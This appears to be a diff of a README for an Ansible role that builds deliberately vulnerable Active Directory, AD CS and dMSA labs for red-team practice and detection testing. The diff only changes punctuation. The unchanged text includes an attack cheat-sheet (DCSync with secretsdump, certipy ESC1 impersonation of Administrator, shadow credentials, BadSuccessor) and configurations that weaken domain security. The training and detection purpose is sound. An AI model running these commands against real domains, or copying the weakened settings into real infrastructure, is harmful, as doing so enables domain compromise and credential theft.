@@ -1,8 +1,8 @@
 # ludus_ad_misconfigs
 
-Generic Active Directory misconfiguration role for [Ludus](https://ludus.cloud) attack-path labs. Applies deliberately vulnerable AD, AD CS, and dMSA configurations to a domain so red teamers can practice — and defenders can detect — the common (and newer) privilege-escalation primitives.
+Generic Active Directory misconfiguration role for [Ludus](https://ludus.cloud) attack-path labs. Applies deliberately vulnerable AD, AD CS, and dMSA configurations to a domain so red teamers can practice - and defenders can detect - the common (and newer) privilege-escalation primitives.
 
-Every misconfiguration is **opt-in and data-driven**: nothing is applied unless you populate the matching variable. Leave a list empty (`[]`) — or a scalar `null` — and its task is skipped.
+Every misconfiguration is **opt-in and data-driven**: nothing is applied unless you populate the matching variable. Leave a list empty (`[]`) - or a scalar `null` - and its task is skipped.
 
 ## Supported misconfigurations
 
@@ -46,13 +46,13 @@ Every misconfiguration is **opt-in and data-driven**: nothing is applied unless 
 - **GPO abuse:** `GroupPolicy` PowerShell module (RSAT-GPMC)
 - Ansible >= 2.9, collection `ansible.windows`
 
-> Run the role on your **domain controller VM** — most tasks edit AD objects and ACLs and need domain rights. CA-registry tasks must reach the CA host.
+> Run the role on your **domain controller VM** - most tasks edit AD objects and ACLs and need domain rights. CA-registry tasks must reach the CA host.
 
 ## Role variables
 
 All variables default to `[]` (or `null`). See `defaults/main.yml` for inline examples of every field.
 
-### Classic AD (abbreviated — see defaults for full schema)
+### Classic AD (abbreviated - see defaults for full schema)
 ```yaml
 ludus_ad_kerberoasting:
   - { user: "svc-sql", spn: "MSSQLSvc/sql01.corp.local:1433", password: "Summer2024!" }
@@ -76,29 +76,29 @@ ludus_ad_group_membership:
   - { member: "CORP\\lowpriv", group: "Domain Admins" }
 ```
 
-### AD CS — vulnerable templates (`ludus_ad_adcs_templates`)
+### AD CS - vulnerable templates (`ludus_ad_adcs_templates`)
 ```yaml
 ludus_ad_adcs_templates:
-  # ESC1 — enrollee supplies subject + Client Auth EKU, no approval
+  # ESC1 - enrollee supplies subject + Client Auth EKU, no approval
   - esc: "esc1"
     name: "VulnClientAuth"
     base_template: "User"
     enrollees: "Domain Users"
     ca: ""                       # "" auto-detects the issuing CA
-  # ESC2 — Any Purpose EKU
+  # ESC2 - Any Purpose EKU
   - { esc: "esc2", name: "VulnAnyPurpose" }
-  # ESC3 — Certificate Request Agent EKU
+  # ESC3 - Certificate Request Agent EKU
   - { esc: "esc3", name: "VulnEnrollAgent" }
-  # ESC9 — CT_FLAG_NO_SECURITY_EXTENSION (breaks strong mapping)
+  # ESC9 - CT_FLAG_NO_SECURITY_EXTENSION (breaks strong mapping)
   - { esc: "esc9", name: "VulnNoSecExt" }
-  # ESC13 — issuance policy OID linked to a privileged group
+  # ESC13 - issuance policy OID linked to a privileged group
   - { esc: "esc13", name: "VulnPolicyLink", policy_oid: "1.3.6.1.4.1.311.21.8.x.y" }
-  # ESC15 — v1 schema, application-policy injection (CVE-2024-49019)
+  # ESC15 - v1 schema, application-policy injection (CVE-2024-49019)
   - { esc: "esc15", name: "VulnV1", base_template: "WebServer" }
 ```
 Each entry: clones `base_template`, sets the ESC-specific `msPKI-*` flags / EKUs, grants Enroll + AutoEnroll to `enrollees`, and publishes the template to the CA.
 
-### AD CS — CA-wide flags (`ludus_ad_adcs_ca_flags`)
+### AD CS - CA-wide flags (`ludus_ad_adcs_ca_flags`)
 ```yaml
 ludus_ad_adcs_ca_flags:
   - { esc: "esc6" }              # +EDITF_ATTRIBUTESUBJECTALTNAME2  (SAN on any template)
@@ -107,7 +107,7 @@ ludus_ad_adcs_ca_flags:
 ```
 Runs `certutil -setreg` on the CA server and restarts `certsvc`.
 
-### AD CS — ACLs (`ludus_ad_adcs_acl`)
+### AD CS - ACLs (`ludus_ad_adcs_acl`)
 ```yaml
 ludus_ad_adcs_acl:
   - { esc: "esc4", principal: "CORP\\lowpriv", target: "User", right: "GenericAll" }
@@ -173,7 +173,7 @@ ludus range deploy
 
 ## Attack cheat-sheet (post-deploy)
 
-Reference primitives — adjust host / domain / tooling to your range.
+Reference primitives - adjust host / domain / tooling to your range.
 
 ```bash
 # Kerberoasting / AS-REP roasting
@@ -187,19 +187,19 @@ getST.py -spn cifs/DC-SBG.corp.local -impersonate Administrator \
 # DCSync
 secretsdump.py -just-dc corp.local/lowpriv:Password1@<DC>
 
-# AD CS — ESC1 (enrollee-supplies-subject)
+# AD CS - ESC1 (enrollee-supplies-subject)
 certipy req -u lowpriv@corp.local -p Password1 -ca CORP-CA \
   -target dc-sbg.corp.local -template VulnClientAuth -upn administrator@corp.local
 certipy auth -pfx administrator.pfx -dc-ip <DC>
 
-# AD CS — ESC6 / ESC9 / ESC16 follow the same certipy req/auth flow
+# AD CS - ESC6 / ESC9 / ESC16 follow the same certipy req/auth flow
 # ESC7:  certipy ca -add-officer ... / issue pending requests
 
 # Shadow Credentials
 certipy shadow auto -u lowpriv@corp.local -p Password1 -account DC-SBG$
 #   or: pywhisker -d corp.local -u lowpriv -p Password1 --target DC-SBG$ --action add
 
-# BadSuccessor (dMSA) — WS 2025
+# BadSuccessor (dMSA) - WS 2025
 #   SharpSuccessor.exe add /impersonate:Administrator \
 #     /path:"OU=ServiceAccounts,DC=corp,DC=local" /account:lowpriv /name:badDMSA
 #   then request a TGT for badDMSA$ -> PAC carries Administrator's groups
@@ -210,7 +210,7 @@ certipy shadow auto -u lowpriv@corp.local -p Password1 -account DC-SBG$
 
 ## Detection notes (blue team)
 
-The misconfigs map to well-known signals — useful when using this role to validate detections:
+The misconfigs map to well-known signals - useful when using this role to validate detections:
 - BadSuccessor: Event **5137** (dMSA create), **5136** (`msDS-ManagedAccountPrecededByLink` / `msDS-DelegatedMSAState` change), **2946** (KERB-DMSA-KEY-PACKAGE auth)
 - AD CS abuse: Event **4886/4887** (cert request/issue), certificates with attacker SAN/UPN
 - Shadow Credentials: **5136** on `msDS-KeyCredentialLink`
@@ -222,11 +222,11 @@ This role **intentionally weakens** Active Directory security. Deploy only in is
 
 ## References
 
-- SpecterOps — *Certified Pre-Owned* (ESC1–ESC8)
-- ly4k **Certipy** wiki — Privilege Escalation (ESC1–ESC16)
-- xbz0n — *Breaking ADCS: ESC1 to ESC16*
-- Akamai (Yuval Gordon) — *BadSuccessor: abusing dMSA*
-- Unit 42 / Semperis / iPurple.team — BadSuccessor analysis & detection
+- SpecterOps - *Certified Pre-Owned* (ESC1–ESC8)
+- ly4k **Certipy** wiki - Privilege Escalation (ESC1–ESC16)
+- xbz0n - *Breaking ADCS: ESC1 to ESC16*
+- Akamai (Yuval Gordon) - *BadSuccessor: abusing dMSA*
+- Unit 42 / Semperis / iPurple.team - BadSuccessor analysis & detection
 
 ## License
 
